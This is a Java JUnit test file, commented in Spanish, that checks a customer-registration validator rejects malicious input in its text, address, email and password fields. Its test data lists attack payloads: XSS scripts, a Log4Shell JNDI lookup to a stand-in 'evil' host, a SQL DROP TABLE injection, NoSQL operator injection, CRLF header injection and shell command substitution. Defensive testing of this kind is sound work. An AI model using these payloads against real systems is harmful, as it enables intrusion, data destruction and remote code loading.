package com.proyecto.servicios.model.request;

import jakarta.validation.ConstraintViolation;
import jakarta.validation.Validation;
import jakarta.validation.Validator;
import jakarta.validation.ValidatorFactory;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.math.BigDecimal;
import java.time.LocalDate;
import java.util.Set;
import java.util.function.Consumer;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/** Cargas típicas de un atacante (HTML, scripts, inyección, caracteres de control) contra cada campo de texto. */
class EntradasMaliciosasValidationTest {

    private static ValidatorFactory factory;
    private static Validator validator;

    @BeforeAll
    static void iniciar() {
        factory = Validation.buildDefaultValidatorFactory();
        validator = factory.getValidator();
    }

    @AfterAll
    static void cerrar() {
        factory.close();
    }

    static RegistroClienteRequest valido() {
        return RegistroClienteRequest.builder()
                .nombre("Ana").apellidoPaterno("López").apellidoMaterno("Ruiz")
                .fechaNacimiento(LocalDate.of(1995, 5, 20))
                .curp("LORA950520MDFPZN01").rfc("LORA950520AB1")
                .sexo("Femenino").nacionalidad("Mexicana").estadoCivil("Soltero(a)")
                .correo("ana.lopez@example.com").telefonoMovil("5512345678")
                .ocupacion("Ingeniera de software").empresa("Pérez & Hijos, S.A. de C.V.")
                .ingresoMensual(new BigDecimal("25000.00"))
                .domicilio(DomicilioRequest.builder()
                        .calle("Av. Insurgentes Sur").numeroExterior("1602-B").numeroInterior("Depto. 4")
                        .colonia("San Rafael I [Potrero]").municipio("Cuauhtémoc").estado("Ciudad de México")
                        .codigoPostal("06470").pais("México").build())
                .password("SecureP@ss123")
                .aceptaTerminos(true).versionTerminos("2026-11-10")
                .build();
    }

    private Set<ConstraintViolation<RegistroClienteRequest>> validar(Consumer<RegistroClienteRequest> cambio) {
        RegistroClienteRequest r = valido();
        cambio.accept(r);
        return validator.validate(r);
    }

    @Test
    void datosLegitimosConPuntuacionYNombresOficialesSonValidos() {
        assertTrue(validar(r -> { }).isEmpty());
        assertTrue(validar(r -> r.getDomicilio().setColonia("CEFERESO No. 9 \"Norte\"")).isEmpty());
        assertTrue(validar(r -> r.getDomicilio().setColonia("Gonzalo Bautista O´Farril")).isEmpty());
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"><svg/onload=alert(1)>",
            "{\"$ne\": null}",
            "${jndi:ldap://evil/a}",
            "Robert'); DROP TABLE clientes;--<",
            "texto\u0000nulo",
            "linea\r\nX-Inyectada: 1",
            "`whoami`",
            "a;b|c"
    })
    void cargasMaliciosasSeRechazanEnCadaCampoDeTextoLibre(String carga) {
        assertFalse(validar(r -> r.setOcupacion(carga)).isEmpty(), "ocupacion");
        assertFalse(validar(r -> r.setEmpresa(carga)).isEmpty(), "empresa");
        assertFalse(validar(r -> r.getDomicilio().setCalle(carga)).isEmpty(), "calle");
        assertFalse(validar(r -> r.getDomicilio().setNumeroExterior(carga)).isEmpty(), "numeroExterior");
        assertFalse(validar(r -> r.getDomicilio().setNumeroInterior(carga)).isEmpty(), "numeroInterior");
        assertFalse(validar(r -> r.getDomicilio().setPais(carga)).isEmpty(), "pais");
        assertFalse(validar(r -> r.setSexo(carga)).isEmpty(), "sexo");
        assertFalse(validar(r -> r.setEstadoCivil(carga)).isEmpty(), "estadoCivil");
        assertFalse(validar(r -> r.setNacionalidad(carga)).isEmpty(), "nacionalidad");
        assertFalse(validar(r -> r.setNombre(carga)).isEmpty(), "nombre");
    }

    @ParameterizedTest
    @ValueSource(strings = {"<script>x</script>", "{a}", "x;y", "a\u0000b"})
    void ubicacionRechazaHtmlAunqueAdmitaCorchetesYComillas(String carga) {
        assertFalse(validar(r -> r.getDomicilio().setColonia(carga)).isEmpty());
        assertFalse(validar(r -> r.getDomicilio().setMunicipio(carga)).isEmpty());
        assertFalse(validar(r -> r.getDomicilio().setEstado(carga)).isEmpty());
    }

    @ParameterizedTest
    @ValueSource(strings = {"\"<script>\"@x.com", "a@b", "a b@c.com", "x@y.com<", "(c)a@b.com"})
    void correosConTrucosSeRechazan(String correo) {
        assertFalse(validar(r -> r.setCorreo(correo)).isEmpty());
        assertFalse(validator.validate(LoginRequest.builder().correo(correo).password("x").build()).isEmpty());
    }

    @Test
    void contrasenasEnormesSeRechazan() {
        String enorme = "Aa1!" + "x".repeat(200);
        assertFalse(validar(r -> r.setPassword(enorme)).isEmpty());
        assertFalse(validator.validate(LoginRequest.builder().correo("a@b.com").password(enorme).build()).isEmpty());
    }

    @Test
    void textosQueExcedenSuLongitudSeRechazan() {
        assertFalse(validar(r -> r.setOcupacion("a".repeat(101))).isEmpty());
        assertFalse(validar(r -> r.getDomicilio().setCalle("a".repeat(101))).isEmpty());
    }

    @Test
    void sinAceptarTerminosNoEsValido() {
        assertFalse(validar(r -> r.setAceptaTerminos(false)).isEmpty());
        assertFalse(validar(r -> r.setAceptaTerminos(null)).isEmpty());
    }
}
